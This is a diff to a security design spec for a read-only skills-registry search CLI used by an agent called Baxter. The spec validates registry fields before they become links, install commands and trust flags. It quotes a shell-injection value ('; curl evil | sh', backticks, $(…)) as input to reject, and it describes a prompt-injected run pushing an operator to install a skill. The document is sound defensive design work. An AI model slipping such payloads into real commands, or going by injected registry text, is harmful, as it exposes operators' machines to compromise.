@@ -55,22 +55,40 @@ skills-cli find <query> [--owner <owner>] [--limit <n>]
 - **Read-only, keyless.** Public search; no API key handled. GET only; a non-2xx or
   non-JSON body yields a clean error result, not a throw.
 - **Response** (the CLI's shape): each hit `{ id, name, installs, source }`, mapped
-  to `{ slug, name, installs, source, owner, repo, url, trusted }`:
-  - `owner`/`repo` parsed from `source`, verbatim (see url-safety below);
-  - `url` — a constructed `https://github.com/<owner>/<repo>` **only** when `source`
-    matches a strict `owner/repo` shape (conservative charset, exactly two path
-    segments, no `@`/`?`/`#`/userinfo/other host); otherwise the raw `source` is
-    emitted under a `sourceRaw` field explicitly labeled unverified, and `url` is
-    null. `source` is registry-response content = attacker-influenced, and `url` is
-    the one field whose purpose is to be clicked by a human, so it must never be a
-    naive concatenation. (TDD target.)
-  - `trusted` — boolean: owner ∈ the trusted-owner allowlist (`vercel-labs`,
-    `anthropics`, `anthropic`, `microsoft`, `vercel`; operator-extensible via env).
+  to `{ slug, name, installs, owner, repo, url, installCommand, trusted, sourceRaw? }`.
+  **Every field the operator or Baxter acts on is composed in the CLI from a
+  strict, validated parse — never naive string interpolation of registry content**
+  (`source` and `id` are attacker-influenced). Let `SEG = /^[A-Za-z0-9._-]+$/`
+  (conservative, ASCII, no `/ @ : ? # % .. ` control chars, length-capped):
+  - `owner`/`repo` — from `source` split on `/`, only when `source` is exactly two
+    `SEG` segments; else both null.
+  - `slug` — the registry `id`, only when it matches `SEG`; else null.
+  - `url` — constructed `https://github.com/<owner>/<repo>` **only** when
+    `owner`/`repo` are set (per above); else null. `url` is the field whose purpose
+    is to be clicked by a human, so it must never be a naive concatenation. (TDD.)
+  - `installCommand` — the exact `npx skills add <owner>/<repo>@<slug>` string,
+    emitted **only** when `owner`, `repo`, AND `slug` all validated; else null. This
+    string may be pasted into the operator's host shell, so composing it from
+    validated parts in the CLI (not by Baxter from raw fields) is the whole point —
+    a slug/name like `; curl evil | sh` / backticks / `$(…)` must never reach a
+    printed command. (TDD.) When any part fails validation, the CLI emits
+    `sourceRaw` (the raw `source`/`id`, clearly labeled unverified) and **no**
+    `installCommand` — Baxter then prints no command (see the skill).
+  - `trusted` — boolean: `owner` (validated) matches the trusted-owner allowlist by
+    **exact case-insensitive ASCII** compare (GitHub owners are case-insensitive, so
+    `Vercel-Labs` matches; any non-exact/lookalike variant — `verceI-labs`,
+    `vercel-labs-x` — does not). Allowlist: **only orgs verified vendor-controlled at
+    inclusion time** — `vercel-labs`, `vercel`, `anthropics`, `microsoft`.
+    (Deliberately **not** `anthropic` singular: Anthropic's org is `anthropics`; a
+    squatter on `anthropic` would otherwise invert the strong signal.)
+    Operator-extensible via env; the env value is validated the same way.
   - **Not sorted by installs.** Ordering is: trusted-owner first, then registry
-    order; `installs` is returned as a field but is a *weak* signal (see below).
-    Output is **untrusted content** (treat like `web-cli`): capped with a
-    truncation marker, time-boxed by one `AbortController` over fetch + body read,
-    metadata only — never a skill's `SKILL.md` body.
+    order; `installs` is a returned field but a *weak* signal (see below). Output is
+    **untrusted content** (treat like `web-cli`): capped with a truncation marker,
+    time-boxed by one `AbortController` over fetch + body read, metadata only —
+    never a skill's `SKILL.md` body. Emitted via `JSON.stringify`, so a `name`
+    containing newlines can't forge a sibling field (e.g. a fake `"trusted": true`)
+    in the run's context. (TDD.)
 - Registry base overridable **by the operator** via `SKILLS_REGISTRY_BASE` (default
   `https://skills.sh`), **not by the run**:
   - claude harness: an env-prefixed invocation (`SKILLS_REGISTRY_BASE=… skills-cli
@@ -90,12 +108,17 @@ wart.) Adapts `find-skills` to the curated model. It tells Baxter:
 - The ecosystem exists; search with `skills-cli find <query>` → metadata JSON.
 - **Trust tiers drive behavior:**
   - **Trusted owner** (`trusted: true`) with reasonable adoption → Baxter may
-    *recommend* it: surface `name`, `owner/repo` **verbatim**, install count, and
-    the `url`, plus a one-line why, and offer to have the operator add it (giving
-    the exact `npx skills add <owner/repo@skill>` command).
-  - **Non-trusted owner** → Baxter does **not** endorse it. He prints the exact
-    `npx skills add <owner/repo@skill>` command and says it's from an unverified
-    owner and the operator's call — nothing more. (Operator refinement.)
+    *recommend* it: surface `name`, `owner/repo` **verbatim**, install count, the
+    `url`, and a one-line why, and offer to have the operator add it — printing the
+    CLI's `installCommand` field **verbatim** (never composing the command himself
+    from parts).
+  - **Non-trusted owner** → Baxter does **not** endorse it. He prints the
+    `installCommand` field verbatim and says it's from an unverified owner, the
+    operator's call — nothing more. (Operator refinement.)
+  - **`installCommand` is null** (the CLI couldn't safely parse owner/repo/slug) →
+    Baxter prints **no** command; he notes the entry couldn't be safely referenced
+    and points the operator at skills.sh to look it up. Baxter must **never** build a
+    `npx skills add …` string from raw fields — only echo the CLI's validated one.
 - **Install counts are self-reported, unauthenticated telemetry — not
   Sybil-resistant.** Treat as a weak tiebreaker, never a trust signal; an attacker
   can inflate a count and squat a lookalike owner (`vercel-labs` vs `verceI-labs`),
@@ -164,6 +187,14 @@ for the baked path is a fast-follow, not blocking v1 (v1 documents the manual st
 - **Metadata residual:** names/owners are attacker-influenced text Baxter reads and
   may relay — same class as any `web-cli` fetch, already accepted; it can't act on
   its own (no install path in `skills-cli`).
+- **Printed-command framing residual:** the `installCommand` string itself is
+  *code-validated* (safe to paste), but the "no endorsement / your call" framing
+  around it for a non-trusted owner is *prompt-level* — a prompt-injected run could
+  wrap a validated command in persuasive text to push the operator to run it. This
+  is an operator-accepted policy call (the operator requested the print behavior);
+  the code guarantee is only that the command string can't be a shell-injection, not
+  that Baxter's surrounding prose is trustworthy. The operator vets the repo (`url`)
+  before running, as with any suggestion.
 - **Install trust persists only when baked** (Q1) — never demote a vetted
   third-party skill to the run-writable `learned-skills/` tier.
 
@@ -179,10 +210,16 @@ Pure, security-critical, mirroring `data-cli.test.mjs`:
    rejects (tested via the export, since the builder can't reach it).
 3. `formatResults(json)` — maps `{id,name,installs,source}` → the enriched row;
    ordering is trusted-first (not installs-sorted); tolerates missing/malformed
-   fields; caps output; sets `trusted` from the allowlist.
-4. **`url` derivation safety** — malicious/odd `source` (extra segments, `@`/`?`/`#`,
-   non-GitHub host, empty, unicode) never yields a constructed `github.com` URL;
-   falls back to `sourceRaw` + null `url`; only a clean `owner/repo` yields a URL.
+   fields; caps output. Trusted-owner matching is **exact case-insensitive ASCII**:
+   `Vercel-Labs` → trusted; `verceI-labs` (lookalike/unicode), `anthropic` (not the
+   real org), `vercel-labs-x` → NOT trusted. Emitted via `JSON.stringify`, so a
+   `name` with newlines can't forge a sibling field (a fake `"trusted": true`).
+4. **`url` + `installCommand` derivation safety (NEW-1)** — malicious/odd `source`
+   or `id` (extra segments, `@`/`?`/`#`, shell metacharacters `; | & \` $( )`,
+   spaces, unicode, empty) never yields a constructed `github.com` `url` NOR an
+   `installCommand`; both fall back to null with `sourceRaw` labeled unverified;
+   only a clean `owner/repo` **and** clean slug yields a `url`/`installCommand`. The
+   printed command must be shell-injection-safe by construction.
 5. **Read-only surface + unknown-flag/verb rejection** — dispatch exposes only
    `find`; an `add`/`install`/unknown verb errors; an unknown `--flag` errors
    loudly (data-cli precedent) so a stray flag can't swallow a value or a future
@@ -205,8 +242,11 @@ skills.sh to confirm the endpoint + shape.
    audit-by-delete; do you want the daemon to also log newly-appeared
    `learned-skills/` names so they show up in `make logs`? (Lean: fast-follow, not
    v1.)
-2. **Trusted-owner allowlist contents** — proposed `vercel-labs`, `vercel`,
-   `anthropics`, `anthropic`, `microsoft`; env-extensible. Right set?
+2. **Trusted-owner allowlist contents** — set to verified-vendor orgs
+   `vercel-labs`, `vercel`, `anthropics`, `microsoft` (dropped `anthropic` singular
+   as unverified/squattable — Anthropic's org is `anthropics`). Confirm this set and
+   that each is the real vendor org before ship; any to add? Env-extensible, and the
+   env value is validated the same way.
 3. **`make add-skill` convenience** for the baked install path — v1 (documented
    manual steps) or fast-follow? (Lean: fast-follow.)
 
